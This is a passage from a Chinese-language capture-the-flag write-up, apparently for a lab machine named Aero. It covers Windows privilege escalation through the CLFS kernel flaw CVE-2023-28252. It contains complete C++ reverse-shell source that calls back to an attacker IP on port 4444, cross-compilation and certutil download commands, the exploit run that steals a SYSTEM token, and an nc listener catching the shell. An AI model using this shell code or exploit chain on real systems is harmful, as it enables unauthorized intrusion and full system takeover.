+</span></span><span style="display:flex;"><span>spelling of the name, or <span style="color:#66d9ef">if</span> a path was included, verify that the path is correct and try again.
+</span></span><span style="display:flex;"><span>At line:1 char:1
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>aero<span style="color:#ae81ff">\s</span>am.emerson
+</span></span></code></pre></div><h2 id="提权枚举">提权枚举</h2>
+<p>确认当前身份与权限，只有普通用户权限，没有任何可利用的令牌特权。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>am.emerson<span style="color:#ae81ff">\D</span>esktop&gt; whoami /all
+</span></span><span style="display:flex;"><span>whoami /all
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>USER INFORMATION
+</span></span><span style="display:flex;"><span>----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User Name        SID                                           
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span> <span style="color:#f92672">==============================================</span>
+</span></span><span style="display:flex;"><span>aero<span style="color:#ae81ff">\s</span>am.emerson S-1-5-21-3555993375-1320373569-1431083245-1001
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GROUP INFORMATION
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Group Name                             Type             SID          Attributes                                        
+</span></span><span style="display:flex;"><span><span style="color:#f92672">======================================</span> <span style="color:#f92672">================</span> <span style="color:#f92672">============</span> <span style="color:#f92672">==================================================</span>
+</span></span><span style="display:flex;"><span>Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\U</span>sers                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\I</span>NTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\T</span>his Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\L</span>ocal account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\N</span>TLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>Mandatory Label<span style="color:#ae81ff">\M</span>edium Mandatory Level Label            S-1-16-8192                                                    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                Description                          State   
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=============================</span> <span style="color:#f92672">====================================</span> <span style="color:#f92672">========</span>
+</span></span><span style="display:flex;"><span>SeShutdownPrivilege           Shut down the system                 Disabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
+</span></span><span style="display:flex;"><span>SeUndockPrivilege             Remove computer from docking station Disabled
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+</span></span><span style="display:flex;"><span>SeTimeZonePrivilege           Change the time zone                 Disabled
+</span></span></code></pre></div><p>查看用户目录，发现提权提示文件 CVE-2023-28252_Summary.pdf，以及负责「测试」上传主题的看门狗脚本 watchdog.ps1。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>am.emerson<span style="color:#ae81ff">\D</span>ocuments&gt; dir
+</span></span><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>am.emerson<span style="color:#ae81ff">\D</span>ocuments
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                 LastWriteTime         Length Name                                                                 
+</span></span><span style="display:flex;"><span>----                 -------------         ------ ----                                                                 
+</span></span><span style="display:flex;"><span>-a----         9/21/2023   9:18 AM          <span style="color:#ae81ff">14158</span> CVE-2023-28252_Summary.pdf                                           
+</span></span><span style="display:flex;"><span>-a----         9/26/2023   1:06 PM           <span style="color:#ae81ff">1113</span> watchdog.ps1
+</span></span></code></pre></div><h2 id="cve-2023-28252-提权clfs">CVE-2023-28252 提权（CLFS）</h2>
+<p>按提示定位到 CLFS 驱动的内核提权漏洞 CVE-2023-28252，克隆公开的 PoC 仓库。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Aero<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ git clone --depth <span style="color:#ae81ff">1</span> https://github.com/duck-sec/CVE-2023-28252-Compiled-exe.git
+</span></span><span style="display:flex;"><span>Cloning into <span style="color:#e6db74">&#39;CVE-2023-28252-Compiled-exe&#39;</span>...
+</span></span><span style="display:flex;"><span>remote: Enumerating objects: 41, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Counting objects: 100% <span style="color:#f92672">(</span>41/41<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Compressing objects: 100% <span style="color:#f92672">(</span>34/34<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Total <span style="color:#ae81ff">41</span> <span style="color:#f92672">(</span>delta 4<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">38</span> <span style="color:#f92672">(</span>delta 4<span style="color:#f92672">)</span>, pack-reused <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>from 0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Receiving objects: 100% <span style="color:#f92672">(</span>41/41<span style="color:#f92672">)</span>, 1.79 MiB | 1.01 MiB/s, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>Resolving deltas: 100% <span style="color:#f92672">(</span>4/4<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span></code></pre></div><p>写一个带日志的 payload。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Aero/privesc<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat rev2.cpp
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;winsock2.h&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;ws2tcpip.h&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;windows.h&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;stdio.h&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;stdarg.h&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;string.h&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define LOGP &#34;C:\\Users\\Public\\rev.log&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>static void lg<span style="color:#f92672">(</span>const char* fmt, ...<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    FILE* f <span style="color:#f92672">=</span> fopen<span style="color:#f92672">(</span>LOGP, <span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>!f<span style="color:#f92672">)</span> <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    va_list ap; va_start<span style="color:#f92672">(</span>ap, fmt<span style="color:#f92672">)</span>; vfprintf<span style="color:#f92672">(</span>f, fmt, ap<span style="color:#f92672">)</span>; va_end<span style="color:#f92672">(</span>ap<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>    fprintf<span style="color:#f92672">(</span>f, <span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">)</span>; fflush<span style="color:#f92672">(</span>f<span style="color:#f92672">)</span>; fclose<span style="color:#f92672">(</span>f<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>int main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    lg<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;=== rev2 start pid=%lu ===&#34;</span>, <span style="color:#f92672">(</span>unsigned long<span style="color:#f92672">)</span>GetCurrentProcessId<span style="color:#f92672">())</span>;
+</span></span><span style="display:flex;"><span>    WSADATA w;
+</span></span><span style="display:flex;"><span>    lg<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;WSAStartup=%d&#34;</span>, WSAStartup<span style="color:#f92672">(</span>MAKEWORD<span style="color:#f92672">(</span>2,2<span style="color:#f92672">)</span>, &amp;w<span style="color:#f92672">))</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    struct addrinfo h; ZeroMemory<span style="color:#f92672">(</span>&amp;h, sizeof<span style="color:#f92672">(</span>h<span style="color:#f92672">))</span>;
+</span></span><span style="display:flex;"><span>    h.ai_family <span style="color:#f92672">=</span> AF_UNSPEC; h.ai_socktype <span style="color:#f92672">=</span> SOCK_STREAM; h.ai_protocol <span style="color:#f92672">=</span> IPPROTO_TCP;
+</span></span><span style="display:flex;"><span>    struct addrinfo* ai <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    int gr <span style="color:#f92672">=</span> getaddrinfo<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;10.10.16.151&#34;</span>, <span style="color:#e6db74">&#34;4444&#34;</span>, &amp;h, &amp;ai<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>    lg<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;getaddrinfo=%d&#34;</span>, gr<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>gr !<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> ai <span style="color:#f92672">==</span> NULL<span style="color:#f92672">)</span> <span style="color:#66d9ef">return</span> 1;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    SOCKET s <span style="color:#f92672">=</span> WSASocketW<span style="color:#f92672">(</span>ai-&gt;ai_family, ai-&gt;ai_socktype, ai-&gt;ai_protocol, NULL, 0, 0<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>    lg<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;socket handle=%lu&#34;</span>, <span style="color:#f92672">(</span>unsigned long<span style="color:#f92672">)</span>s<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>s <span style="color:#f92672">==</span> INVALID_SOCKET<span style="color:#f92672">)</span> <span style="color:#f92672">{</span> lg<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;socket fail err=%lu&#34;</span>, <span style="color:#f92672">(</span>unsigned long<span style="color:#f92672">)</span>WSAGetLastError<span style="color:#f92672">())</span>; <span style="color:#66d9ef">return</span> 1; <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    int cr <span style="color:#f92672">=</span> WSAConnect<span style="color:#f92672">(</span>s, ai-&gt;ai_addr, <span style="color:#f92672">(</span>int<span style="color:#f92672">)</span>ai-&gt;ai_addrlen, NULL, NULL, NULL, NULL<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>    lg<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;WSAConnect=%d err=%lu&#34;</span>, cr, <span style="color:#f92672">(</span>unsigned long<span style="color:#f92672">)</span>WSAGetLastError<span style="color:#f92672">())</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>cr <span style="color:#f92672">==</span> SOCKET_ERROR<span style="color:#f92672">)</span> <span style="color:#66d9ef">return</span> 1;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    const char* bins<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;C:\\Windows\\System32\\cmd.exe&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>int i <span style="color:#f92672">=</span> 0; i &lt; 2; i++<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        STARTUPINFOA si; ZeroMemory<span style="color:#f92672">(</span>&amp;si, sizeof<span style="color:#f92672">(</span>si<span style="color:#f92672">))</span>;
+</span></span><span style="display:flex;"><span>        si.cb <span style="color:#f92672">=</span> sizeof<span style="color:#f92672">(</span>si<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>        si.dwFlags <span style="color:#f92672">=</span> STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+</span></span><span style="display:flex;"><span>        si.wShowWindow <span style="color:#f92672">=</span> SW_HIDE;
+</span></span><span style="display:flex;"><span>        si.hStdInput <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>HANDLE<span style="color:#f92672">)</span>s; si.hStdOutput <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>HANDLE<span style="color:#f92672">)</span>s; si.hStdError <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>HANDLE<span style="color:#f92672">)</span>s;
+</span></span><span style="display:flex;"><span>        PROCESS_INFORMATION pi; ZeroMemory<span style="color:#f92672">(</span>&amp;pi, sizeof<span style="color:#f92672">(</span>pi<span style="color:#f92672">))</span>;
+</span></span><span style="display:flex;"><span>        char cmd<span style="color:#f92672">[</span>512<span style="color:#f92672">]</span>; strcpy<span style="color:#f92672">(</span>cmd, bins<span style="color:#f92672">[</span>i<span style="color:#f92672">])</span>;
+</span></span><span style="display:flex;"><span>        BOOL ok <span style="color:#f92672">=</span> CreateProcessA<span style="color:#f92672">(</span>NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>        lg<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;CreateProcess(%s)=%d err=%lu&#34;</span>, bins<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>, <span style="color:#f92672">(</span>int<span style="color:#f92672">)</span>ok, <span style="color:#f92672">(</span>unsigned long<span style="color:#f92672">)</span>GetLastError<span style="color:#f92672">())</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>ok<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            WaitForSingleObject<span style="color:#f92672">(</span>pi.hProcess, INFINITE<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>            lg<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;child exited&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>            break;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> 0;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>交叉编译成 Windows x64 可执行文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Aero<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ x86_64-w64-mingw32-g++ rev2.cpp -o rev2.exe -lws2_32
+</span></span><span style="display:flex;"><span>                                                                                                                                                                        
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Aero<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ file rev.exe 
+</span></span><span style="display:flex;"><span>rev.exe: PE32+ executable <span style="color:#66d9ef">for</span> MS Windows 5.02 <span style="color:#f92672">(</span>console<span style="color:#f92672">)</span>, x86-64, <span style="color:#ae81ff">18</span> sections
+</span></span></code></pre></div><p>把 PoC 与 payload 一起下载到靶机。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>am.emerson<span style="color:#ae81ff">\D</span>ocuments&gt; certutil -urlcache -f http://10.10.16.151:8000/exploit.exe exploit.exe
+</span></span><span style="display:flex;"><span>certutil -urlcache -f http://10.10.16.151:8000/exploit.exe exploit.exe
+</span></span><span style="display:flex;"><span>****  Online  ****
+</span></span><span style="display:flex;"><span>CertUtil: -URLCache command completed successfully.
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>am.emerson<span style="color:#ae81ff">\D</span>ocuments&gt; certutil -urlcache -f http://10.10.16.151:8000/rev.exe rev.exe
+</span></span><span style="display:flex;"><span>certutil -urlcache -f http://10.10.16.151:8000/rev.exe rev.exe
+</span></span><span style="display:flex;"><span>****  Online  ****
+</span></span><span style="display:flex;"><span>CertUtil: -URLCache command completed successfully.
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>am.emerson<span style="color:#ae81ff">\D</span>ocuments&gt; dir
+</span></span><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>am.emerson<span style="color:#ae81ff">\D</span>ocuments
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                 LastWriteTime         Length Name                                                                 
+</span></span><span style="display:flex;"><span>----                 -------------         ------ ----                                                                 
+</span></span><span style="display:flex;"><span>-a----         9/21/2023   9:18 AM          <span style="color:#ae81ff">14158</span> CVE-2023-28252_Summary.pdf                                           
+</span></span><span style="display:flex;"><span>-a----         9/28/2026  12:20 AM         <span style="color:#ae81ff">367104</span> exploit.exe                                                          
+</span></span><span style="display:flex;"><span>-a----         9/28/2026  12:21 AM         <span style="color:#ae81ff">121111</span> rev.exe                                                              
+</span></span><span style="display:flex;"><span>-a----         9/26/2023   1:06 PM           <span style="color:#ae81ff">1113</span> watchdog.ps1 
+</span></span></code></pre></div><p>以 1208（即 0x4b8）令牌偏移执行 PoC，成功窃取 SYSTEM 令牌并执行我们的 payload。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>am.emerson<span style="color:#ae81ff">\D</span>ocuments&gt; .<span style="color:#ae81ff">\e</span>xploit.exe <span style="color:#ae81ff">1208</span> <span style="color:#ae81ff">1</span> <span style="color:#e6db74">&#34;C:\Users\sam.emerson\Documents\rev2.exe&#34;</span>                                                                        
+</span></span><span style="display:flex;"><span>.<span style="color:#ae81ff">\e</span>xploit.exe <span style="color:#ae81ff">1208</span> <span style="color:#ae81ff">1</span> <span style="color:#e6db74">&#34;C:\Users\sam.emerson\Documents\rev.exe&#34;</span>                                                                                                           
+</span></span><span style="display:flex;"><span>Executing command: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>am.emerson<span style="color:#ae81ff">\D</span>ocuments<span style="color:#ae81ff">\r</span>ev.exe                                                                                                               
+</span></span><span style="display:flex;"><span>                                                                                                                                                                        
+</span></span><span style="display:flex;"><span>                                                                                                                                                                        
+</span></span><span style="display:flex;"><span>ARGUMENTS                                                                                                                                                               
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> TOKEN OFFSET 4b8                                                                                                                                                    
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> FLAG <span style="color:#ae81ff">1</span>                                                                                                                                                              
+</span></span><span style="display:flex;"><span>                                                                                                                                                                        
+</span></span><span style="display:flex;"><span>                                                                                                                                                                        
+</span></span><span style="display:flex;"><span>VIRTUAL ADDRESSES AND OFFSETS                                                                                                                                           
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> NtFsControlFile Address --&gt; 00007FFE5A6A4240                                                                                                                        
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> pool NpAt VirtualAddress --&gt;FFFFD686027FE000                                                                                                                        
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MY EPROCESSS FFFFE7036F6ED1C0                                                                                                                                       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SYSTEM EPROCESSS FFFFE703696A4040
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> _ETHREAD ADDRESS FFFFE7036C8BB080
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PREVIOUS MODE ADDRESS FFFFE7036C8BB2B2
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Offset ClfsEarlierLsn --------------------------&gt; <span style="color:#ae81ff">0000000000013220</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Offset ClfsMgmtDeregisterManagedClient --------------------------&gt; 000000000002BFB0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Kernel ClfsEarlierLsn --------------------------&gt; FFFFF80007053220
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Kernel ClfsMgmtDeregisterManagedClient --------------------------&gt; FFFFF8000706BFB0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Offset RtlClearBit --------------------------&gt; <span style="color:#ae81ff">0000000000343010</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Offset PoFxProcessorNotification --------------------------&gt; 00000000003DBD00
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Offset SeSetAccessStateGenericMapping --------------------------&gt; 00000000009C87B0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Kernel RtlClearBit --------------------------&gt; FFFFF80005F43010
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Kernel SeSetAccessStateGenericMapping --------------------------&gt; FFFFF800065C87B0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Kernel PoFxProcessorNotification --------------------------&gt; FFFFF80005FDBD00
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PATHS
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Folder Public Path <span style="color:#f92672">=</span> C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Base log file name path<span style="color:#f92672">=</span> LOG:C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\6</span><span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Base file path <span style="color:#f92672">=</span> C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\6</span>6.blf
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Container file name path <span style="color:#f92672">=</span> C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\.</span>p_66
+</span></span><span style="display:flex;"><span>Last kernel CLFS address <span style="color:#f92672">=</span> FFFFD685F1814000
+</span></span><span style="display:flex;"><span>numero de tags CLFS founded <span style="color:#ae81ff">9</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last kernel CLFS address <span style="color:#f92672">=</span> FFFFD685F6BCE000
+</span></span><span style="display:flex;"><span>numero de tags CLFS founded 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Log file handle: <span style="color:#ae81ff">0000000000000124</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Pool CLFS kernel address: FFFFD685F6BCE000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>number of pipes created <span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>number of pipes created <span style="color:#f92672">=</span><span style="color:#ae81ff">4000</span>
+</span></span><span style="display:flex;"><span>TRIGGER START
+</span></span><span style="display:flex;"><span>System_token_value: FFFFD685EEE654FF
+</span></span><span style="display:flex;"><span>SYSTEM TOKEN CAPTURED
+</span></span><span style="display:flex;"><span>Closing Handle
+</span></span><span style="display:flex;"><span>ACTUAL USER<span style="color:#f92672">=</span>SYSTEM
+</span></span><span style="display:flex;"><span>WE ARE SYSTEM
+</span></span><span style="display:flex;"><span>Executing command: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>am.emerson<span style="color:#ae81ff">\D</span>ocuments<span style="color:#ae81ff">\r</span>ev2.exe
+</span></span></code></pre></div><p>再次监听，这次收到 SYSTEM 权限的 shell。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Aero<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo rlwrap -cAr nc -lvknp <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.151<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.229.128<span style="color:#f92672">]</span> <span style="color:#ae81ff">64756</span>
+</span></span><span style="display:flex;"><span>Windows PowerShell
